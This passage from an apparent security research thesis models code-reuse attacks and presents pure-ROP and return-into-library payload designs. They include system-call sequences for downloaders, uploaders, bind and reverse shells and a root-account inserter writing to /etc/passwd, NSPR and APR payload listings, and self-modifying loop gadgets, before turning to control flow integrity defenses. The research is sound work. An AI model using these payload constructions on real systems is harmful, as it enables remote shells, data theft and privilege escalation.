(cid:15) Downloader: A program which connects to a remote host, downloads arbitrary con-
tent, saves it to disk, and executes it
(cid:15) Uploader: A program which exﬁltrates ﬁles from the host to a remote location
(cid:15) Backdoor: A program which creates a shell accessible from an external host and
awaits a connection.
(cid:15) Reverse Backdoor: A program which creates a connection to an external host and
binds a shell to that connection.
(cid:15) Root Inserter: Adds a new root user to the system
We implement every payload using purely ROP. We begin by reducing each payload to
a simple linear sequence of system calls, shown in Figure 4-6. We do not need looping
constructs, although Turing completeness is available to more advanced payloads [34].
The phantom stack referenced in the ﬁgure is explained below. In essence, it provides the
memory management required to enable reusable system call chains.
The challenge, then, is to translate each sequence of system calls to a ROP program.
We extract a catalog of ROP gadgets from GNU libc version 2.13 using the established
Galileo algorithm [34], and craft each payload using these gadgets.
Due to the level of system call reuse across these payloads, we construct each system
call gadget to be modular and easily chained. For calls like socket, translation to ROP
code is straightforward: arguments are immediate values that can be written to the stack
during the payload injection phase, registers can be loaded via common pop reg; ret
sequences, then the call can be invoked.
Unfortunately, things are harder in the general case. Setting arguments for an arbitrary
chain of system calls introduces two challenges: dynamically generated values (like ﬁle
descriptors) must be tracked across system calls, and some arguments (e.g. pointers to
struct pointers) must be passed via multiple levels of indirection. These challenges are
further complicated by two restrictions imposed by ROP: the stack cannot be pushed to in
an uncontrolled way (since that is where the payload resides), and register access may be
constrained by the available gadgets in the catalog.
36
Uploader
sbrk(0);
sbrk(phantom_stack_size);
fd = socket(2, 1, 0);
connect(fd, &addr, 0x10);
fd2 = open("target_file", 0);
sendfile(fd, fd2, 0, file_size);
Root Inserter
sbrk(0);
sbrk(phantom_stack_size);
setuid(0);
fd = open("/etc/passwd", 002001);
write(fd, "toor:x:0:0::/:/bin/bash\n", 24);
Downloader
sbrk(0);
sbrk(phantom_stack_size);
fd = socket(2, 1, 0);
connect(fd, &addr, 0x10);
read(fd, buf, buf_len);
fd2 = open("badfile", 0101, 00777);
write(fd2, buf, buf_len);
execve("badfile", ["badfile"], 0);
Backdoor
sbrk(0);
sbrk(phantom_stack_size);
fd = socket(2, 1, 0);
bind(fd, fd, &addr, 0x10);
listen(fd, 1);
fd2 = accept(fd, &addr, 0x10);
dup2(fd2, 0);
dup2(fd2, 1);
dup2(fd2, 2);
execve("/bin/sh", ["/bin/sh"], 0);
Reverse Backdoor
sbrk(0);
sbrk(phantom_stack_size);
fd = socket(2, 1, 0);
connect(fd, &addr, 0x10);
dup2(fd, 0);
dup2(fd, 1);
dup2(fd, 2);
execve("/bin/sh", ["/bin/sh"], 0);
Figure 4-6: System-call-based implementations of backdoor and reverse backdoor
37
As an example of the above challenges, consider the connect system call, which is
critical for any network I/O. Like all socket setup functions in Linux, it is invoked via the
socketcall interface: eax is set to 0x66 (the system call number), ebx is set to 0x3
(connect), and ecx is set as a pointer to the arguments to connect.
These arguments include both dynamic data (a ﬁle descriptor) and double indirection
(a pointer to data that has a pointer to a struct). Since the stack cannot be pushed to
and dynamic data cannot be included at injection time, these arguments have to be written
elsewhere in memory. Since register-register operations are limited (especially just prior
to the call, when eax and ebx are off-limits), the above memory setup has to be done
with only a few registers. Finally, since this is just one system call in a chain of such calls,
memory addresses should be tracked for future reuse.
We resolve these issues by implementing a ‘phantom’ stack on the heap. The phantom
stack is simply memory allocated by the attacker via the sbrk system call, which gets or
sets the current program break. Note that this is not a stack pivot: the original program
stack is still pointed to by esp. This is a secondary stack, used by the attacker to manage
payload data. A related construction was used by Checkoway, et. al [9] for creating ROP
payloads on the ARM platform.
Creating the phantom stack does not require any prior control over the heap, and goes
through legitimate kernel interfaces to allocate the desired memory. Pushes and pops to this
stack reduce to arithmetic gadgets over a phantom stack pointer register. For our gadget
catalog, eax was best suited to the purpose. A degree of software engineering is required
to ensure correct phantom stack allocation and management.
A complete ROP gadget to connect to localhost on port 43690 is presented in Fig-
ure 4-7. The phantom stack must already be allocated, and the active ﬁle descriptor is
assumed to be pushed onto it. The gadget can be divided into three functional components,
as indicated by the lines drawn across the stack diagram.
From the bottom, the ﬁrst component prepares the arguments to connect(fd, &addr,
0x10) on the phantom stack and puts a pointer to these arguments in ecx. The second
component saves the phantom stack pointer into edx, loads eax and ebx with the nec-
essary system call and socketcall identiﬁers, and invokes the system call interrupt. The
38
Figure 4-7: ROP gadget for connect(fd, &addr, 0x10)
39
pop ecxpop edx0x0100007f0x04sub eax, edxint 0x80pop ebppop edipop esipop ebx0xFF0xFF0xFF0xFFmov [eax], ecx0xAAAA00020x040x100x04mov ebx,edxxchg ebx,ecxxchg eax,edxpop edx0x10add eax, edx0x30x66mov eax,edxmov eax,[eax]pop reg instructions following the interrupt are unavoidable, as this is the smallest sys-
tem call gadget we could ﬁnd. To prevent control ﬂow disruptions, we pad the stack with
junk values to be loaded into the popped registers. The third component is similar to tra-
ditional function epilogues. It moves eax above the memory used by this gadget, freeing
that portion of the phantom stack for use by other gadgets.
We have implemented similar gadgets for all other system calls used by our payloads.
By executing these in sequence, any of the payloads described above can be implemented
using the ROP gadgets derived from the libc shared library. These gadgets are presented in
appendix A.
4.4.2 Return-into-LibN
While Return-into-Libc (RiL) attacks can, in principle, be performed against any library, it
is not clear whether there exist common, frequently linked libraries which actually possess
useful functions for implementing real-world malware payloads. These alternative sources
would be quite valuable in cases where libc is given special protection due to its ubiquity
and power with respect to system call operations.
To this end, the formal model treats libc as something of a special case: RiL attacks
require that useful functions are available from libc. In this section, we show that Return-
into-Libc attacks can in fact be performed against many other libraries. Speciﬁcally, the
Apache Portable Runtime (used by the Apache webserver), the Netscape Portable Runtime
(used by Firefox and Thunderbird), and the GLib application framework (used by programs
running in the GNOME desktop environment) possess sufﬁcient I/O functions to implement
downloaders, uploaders, backdoors, and reverse backdoors.
We use the attacker model from Tran et al. [40], which allows the attacker to cause the
execution of functions of their choosing with arguments of their choosing, as long as those
functions are already present in the process address space. The attacker also has some
region of memory under his control and knows the addresses of memory in this region.
This could be an area of the stack above the payload itself or memory in a known writable
location, possibly allocated by one of the available library functions. The memory is used to
40
PR_NewTCPSocket();
...
PR_NewTCPSocket();
PR_Connect(sock, &addr, NULL);
PR_ProcessAttrSetStdioRedirect(attr,PR_StandardInput,sock);
PR_ProcessAttrSetStdioRedirect(attr,PR_StandardOutput,sock);
PR_ProcessAttrSetStdioRedirect(attr,PR_StandardError,sock);
PR_CreateProcess("/bin/sh", argv, NULL, attr);
Figure 4-8: Reverse Backdoor using NSPR
store data structures and arguments, as well as to maintain data persistence across function
calls.
NSPR NSPR is a libc-like library that does not have a generic system call interface.
However, it supports socket-based I/O, ﬁle system operations, process spawning, and mem-
ory mapping and manipulation. These are sufﬁcient to implement an uploader, downloader,
backdoor, and reverse backdoor in a straightforward way. The lack of any setuid-like func-
tion makes root-insertion impossible, but a root-inserter could easily be injected via one of
the other payloads. Figure 4-8 presents a reverse backdoor written in NSPR. All payloads
are written using NSPR version 4.9.
Note the large number (denoted with an ellipsis) of socket creations in Figure 4-8. This
is due to the unavailability of function return values in Return-into-Libc-like programming.
Any operation which is not a function (including variable assignment) cannot be used to
write a payload with this technique. As such, we must ‘spray’ the ﬁle descriptor space by
allocating many descriptors and then guess ﬁle descriptors using an immediate value. Note
that while NSPR uses a custom PRFileDesc socket descriptor, the structure’s layout is
well documented, and the attacker can easily write the descriptor directly to a prepared
PRFileDesc object.
The only other complication when writing NSPR payloads is in how a new address
space is prepared when creating a shell for backdoors. There is no dup2 analogue that lets
the attacker bind standard streams to the new shell. Instead, process attributes specifying
redirected streams must be set before a new process is spawned. Upon process creation the
streams are set to the ﬁle descriptor of the socket, and the attack proceeds normally.
41
apr_pool_create(&pool, NULL);
apr_socket_create(&sock, 2, 1, 0, pool);
apr_socket_connect(sock, &addr);
apr_socket_recv(sock, buf, buf_size);
apr_file_open(&file, "badfile", 0x00006, 0777, pool);
apr_file_write(file, buf, buf_size);
apr_proc_create(&proc, "badfile", "badfile", 0, 0, pool);
Figure 4-9: Downloader using APR
APR APR also implements a libc-like functionality, but uses a function call convention
that makes many Return-into-Libc attacks much more reliable. Functions in APR return
status codes and write the result of the computation to a memory region speciﬁed by the
user. This eliminates (among other difﬁculties) the need for ﬁle descriptor spraying. Figure
4-9 depicts a downloader using APR function calls. All payloads use APR version 1.4.
The apr pool create function is a library-speciﬁc memory allocator that must be
called at the start of any APR program. While a pool created by the compromised process
likely already exists, the attacker is unlikely to know where it is located in memory. The
remaining functions are fairly straightforward: a socket is opened, data is downloaded to a
ﬁle with execute permissions and that ﬁle is run. apr proc create is similar to a Unix
fork, so the victim process will not be overwritten in memory by the payload.
APR function calls can be used to implement a downloader and an uploader. The library
does provide a dup2 analogue, but only allows redirection of streams to ﬁles and not to
sockets. This means that backdoors cannot be directly implemented. Privilege modiﬁcation
is also unsupported, preventing root insertion. Since a downloader can be used to execute
arbitrary code, however, these two payloads sufﬁce in practice.
4.4.3 Turing Complete LibN
The previous defense bypass utilized simple, linear code. More advanced attacks which,
e.g. perform searches or other highly algorithmic routines may need a fully Turing com-
plete catalog of functions available for reuse. Tran et al. [40] show that libc is itself Turing
complete on the function level (i.e. enables Turing complete return-into-libc code).
42
In this section, we show that many other libraries have Turing complete sets of func-
tions, enabling a larger corpus for creation of advanced Return-into-LibN payloads. Many
of the constructs proposed by Tran et al. [40] can be reapplied to other libraries: basic arith-
metic and memory manipulation functions are common. Their looping construct, however,
relied on a construct somewhat peculiar to libc: the longjmp function. Longjmp allows
user-deﬁned values of the stack pointer to be set, permitting permutation of the ‘instruction’
pointer in a code reuse attack.
The lack of a longjmp-like function outside of libc precludes modifying the stack
pointer to implement a jump. Without a branch instruction no looping constructs are pos-
sible and Turing completeness is unavailable. Fortunately, the ‘text’ segment of a code
reuse payload is writable, since it was after all injected as data into the stack or heap.
This enables an alternative approach using conditional self-modiﬁcation. In combination
with conditional evaluation, this can be used to build a looping construct. Note that this
technique works even though W(cid:8)X is enabled because self-modiﬁcation is applied to the
addresses which constitute the Return-into-LibN payload, not the program code.
We can use self-modiﬁcation to create a straight-line instruction sequence semantically
equivalent to while(p(x)) do fbodyg, where p(x) is a predicate on a variable x
and fbodyg is arbitrary code. The attacker is assumed to have the ability to do arith-
metic, to read and write to memory, and to conditionally evaluate a single function. These
capabilities are derivable from common functions, explained by Tran et al. [40].
We describe the mechanism in three stages of reﬁnement: in a simpliﬁed execution
model, as a generic series of function invocations, and as an implementation using the
Apache Portable Runtime.
Using this environment, it is possible to build the the looping mechanism presented in
Figure 4-10. For readability each line is labeled. References to these labels should be sub-
stituted with the line they represent, e.g. Reset should be read as iterate=’nop;’;.
iterate and suffix are strings in memory which hold the loop-related code and the
remaining program code, respectively; nop is the no-operation instruction that advances
the instruction pointer. The address [ip+1] represents the memory location immediately
following the address pointed to by the instruction pointer. The | operator denotes con-
43
Reset
Body
Evaluate
: iterate=‘nop;’;
: ;
: If p(x): iterate=‘Reset;Body;
Self-Modify : [ip+1] = iterate|suffix;
Evaluate;Self-Modify’;
Figure 4-10: Self-Modifying While Loop
sprintf(stack, "%08x%08x%08x%08x%08x");
atomic_add(&stack, 32);
atomic_add(stack, offset);
sprintf(iterate, nop);
/* body */
conditional(test, sprintf(iterate, loopcode));
sprintf(stack, "%s%s", iterate, suffix);
Figure 4-11: Generic self-modifying Return-into-Libc while loop
catenation.
Each iteration, iterate is reset to be a nop instruction. The loop body is executed
and the predicate p(x) is checked. If it evaluates to true, iterate is set to the loop
instruction sequence. Finally, iterate is concatenated with the remaining program code
and moved to the next memory address that will pointed at by the instruction pointer. Note
that if the predicate evaluates to true, the nop is replaced by another loop iteration. If the
predicate evaluates to false, iterate is unchanged and execution will proceed into the
sufﬁx.
The basic self-modifying while loop can easily be converted to Return-into-Libc code.
Figure 4-11 presents one such possible conversion. The implementation of this example
assumes is for a Linux call stack. A stack frame, from top to bottom, consists of parameters,
a return value, a saved frame pointer, and space for local variables. In the basic model the
attacker was aware of the value of ip at the end of the loop and could easily write code to
[ip+1]. In real world scenarios, however, the attacker does not know the analogous esp
value a priori. Fortunately a number of techniques ([38, 41, 46]) exist to leak esp to the
attacker. We chose to use format string vulnerabilities. Note this is not a vulnerability per
se, as it is not already present in a victim process. It is simply function call made by the
attacker with side effects that are normally considered “unsafe”. Since this is a code reuse
44
attack, there is no reason to follow normal software engineering conventions.
The ﬁrst line uses an ‘unsafe’ format string to dump the stack up to the saved frame
pointer (which in this example is ﬁve words above sprintf’s local variables) to the
stack variable. Since the attacker crafted the payload, no guesswork is involved in de-
termining the number of bytes between sprintf’s local variable region and the saved
frame pointer. In the second line the ﬁrst four words in the dump are discarded, and in the
third the address of the stack pointer is calculated based on the offset of the saved frame
pointer from the stack pointer. Note that the resultant value of esp should point to the
stack frame which will be returned to after the last instruction in the ﬁgure, not the stack
frame which will be returned to after the function which is currently executing. Since the
attacker injected the payload onto the stack he will know the necessary offset.
The next three lines correspond to Reset; Body; Evaluate. iterate, nop,
loopcode, and suffix are all buffers in attacker-controlled memory. nop is any func-
tion call. loopcode is the sequence of instructions from Figure 4-11, and suffix is the
remaining payload code following loop execution. The ﬁnal line copies the concatenation
of the instructions in iterate and suffix to the program stack, overwriting the payload
from that point forward.
The generic attack executes in a Linux program stack but makes no assumptions about
the structure of the injected payload. When constructing a speciﬁc self-modifying gadget,
however, the payload structure must be ﬁxed. We assume that the attacker has injected a
forged sequence of stack frames as a payload. The bottom-most frame (assuming stack
grows down) executes ﬁrst, returns to the frame associated with the second function to be
called, etc. Parameters are included in the initial stack injection. An attack using only
functions from the Apache Portable Runtime is shown in Figure 4-12.
The attacker is assumed to have a blank key-value table already written to memory.
This is a simple, well-deﬁned data structure, and requires no extra attacker capabilities.
The ﬁrst line adds an entry to the table: the key is the condition to be matched (a string),
and the value is the stack frame sequence which implements the loop. The stack-locator
and Reset code is as described above.
The conditional evaluator, apr table do, works as follows.
It ﬁrst ﬁlters the ta-
45
apr_table_set(table, "match_string", "loopcode");
apr_snprintf(buf, 1024, "%08x%08x%08x%08x%08x");
apr_atomic_add32(&stack, 32);
apr_atomic_add32(stack, offset);
apr_snprintf(iterate, 100, "nop");
/* body */
apr_table_do(apr_snprintf, iterate, table, condition, NULL);
apr_snprintf(stack, 1024, iterate);
Figure 4-12: Self-modifying while loop in APR
ble by the condition string. Only entries whose keys are identical to this string are
retained. For all remaining keys, the function in the ﬁrst argument to apr table do
is called on each entry. The function is passed three arguments:
the second argument
to apr table do, the key for the current entry, and the value for the current entry. In
this case, apr snprintf(iterate, "mask string", "loopcode") is called
on the single entry only if condition matches mask string via string comparison. If
so, it writes loopcode to iterate for a number of bytes up to the integer representation
of mask string’s address. Since this value is passed on the stack, the length limit will
be on the order of gigabytes. The value of iterate is then written to the stack location
corresponding to the stack frame immediately above the last snprintf frame. Note that
the forged stack frames which constitute iterate must be automatically adjusted so that
saved ebp values and other stack-referential pointers are modiﬁed appropriately. This can
be done automatically via a mechanism similar to the format string trick.
4.5 Discussion
The complexity of the code reuse space and the large variety of assumptions and threat
models make it difﬁcult to compare defenses or reason about the whole space. To solve
this, in this chapter, we constructed a model of the code reuse space where statements
about attacker assumptions and the defenses that prevent them are represented as proposi-
tional formulas. We used a SAT-solver to search the space for insecure conﬁgurations and
to generate ideas about where to look for new attacks or defenses. We used the model to an-
46
alyze the security of applications running with the security features available in an Ubuntu
Server and to suggest and construct several new classes of attacks: pure ROP payloads,
return-into-libn and Turing complete return-into-libn. Our modeling technique can be used
in future work to formalize the process of threat model deﬁnition, analyze defense conﬁg-
urations, reason about composability and efﬁcacy, and hypothesize about new attacks and
defenses.
47
48
Chapter 5
Control Flow Integrity Enforcement
Attackers have bypassed many types of narrowly targeted ROP defenses. For example,
attackers have bypassed defenses such as shadow call stacks [36] and gadget elimination
[28] [26] (which prevent attackers from chaining gadgets together with ret instructions)
by overwriting indirect jump targets instead of return addresses [9] [6]. In response to these
attacks, control ﬂow integrity (CFI) has been proposed as a comprehensive defense against
code reuse attacks, [37] [9] [6]. However, this claim has not been formally veriﬁed and the
overall effectiveness of CFI has not been demonstrated.
CFI systems attempt to limit the control ﬂow of the program to only control transfers
that exist in the program when it is operating normally [2] [47]. These systems validate
return addresses and function pointers at runtime to prevent attackers from redirecting con-
trol to arbitrary addresses. Thus, attacks that hijack the control ﬂow can only redirect the
control ﬂow to a limited set of locations that have been explicitly allowed, rather than any
location in the address space.
As a result of theoretical and practical considerations, CFI systems allow a superset
of the actual, valid control transfers. Predicting the actual control graph is undecidable
because, for a program with no inputs and an exact control ﬂow graph, the problem of
deciding whether the program will halt can be reformulated as deciding whether there is a
path between the start and a halt instruction, which is decidable, so an exact control ﬂow
graph could be used to solve the halting problem. Given the fact that it is not possible to
predict the exact graph, to avoid false positives that would cause the program to crash in
49
normal circumstances, control ﬂow enforcement systems build an over-approximation of
the control ﬂow graph which includes extra edges. In practice, many of the standard uses
of function pointers in C programs, such as callback functions and function dispatch tables,
create many extra edges in the over-approximation. The use of these, and other common
design patterns make it difﬁcult for static analysis tools to accurately predict the targets
of indirect function calls, which in turn makes it difﬁcult to accurately predict the set of
call sites for each return. Furthermore, existing CFI systems prioritize performance over
precise control ﬂow enforcement. Depending on the implementation details of the system,
allowing extra edges in the enforced control graph helps minimize the number of extra
computations [2] or the memory overhead [47].
The extra edges allowed in the control ﬂow graph give attackers extra degrees of free-
dom when attempting to create malware that works when CFI systems are deployed. An
attcker that has overwritten a return address or function pointer can use any of the allowed
targets of that control transfer as gadgets in a code reuse attack.
In this chapter, we investigate the control graphs enforced by two CFI systems. We rep-
resent programs as graphs, where nodes are blocks of code and edges are permitted control
transfers. We use an interactive graph search to ﬁnd legal paths through the program. The
search takes into account paths that exist as a result of normal program ﬂow as well as paths
that only exist when an attacker has control of the stack.
5.1 Existing CFI Systems
5.1.1 Compact Control Flow Integrity and Randomization
Zhang et al. propose a binary rewriter which they call Compact Control Flow Integrity and
Randomization (CCFIR) [47] where they enforce CFI using lookup tables (called Spring-
board sections) of valid targets. The Springboard sections are new sections in Windows